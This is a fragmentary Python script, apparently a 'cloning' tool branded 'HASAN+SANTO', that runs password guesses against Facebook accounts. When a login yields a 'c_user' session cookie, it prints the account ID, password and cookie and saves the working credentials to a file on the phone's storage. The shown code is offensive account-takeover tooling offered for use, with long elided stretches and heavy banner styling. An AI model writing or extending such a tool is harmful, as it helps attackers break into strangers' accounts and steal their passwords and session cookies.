...
psb('\x1b[1;31mBANGLADESH HASAN+SANTO CLONING START PLEASE WAIT ..........')
time.sleep(3)
...
def main():
    ...
    banner()
    print(f' ')
    print(f'{M}╔══[ [•] TOOL NAME : {H}HASAN+SANTO')
    print(f'{M}║══[ [•] YOR IP    : ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;92m[HASAN+SANTO-OK] '+uid+' | '+ps+'\033[0;97m')
                print(f'    {B}[NUMBER📳] {K}'+uid+'  ')
                print(f'    {B}[COOKI💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/HASAN+SANTO-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mHASAN+SANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
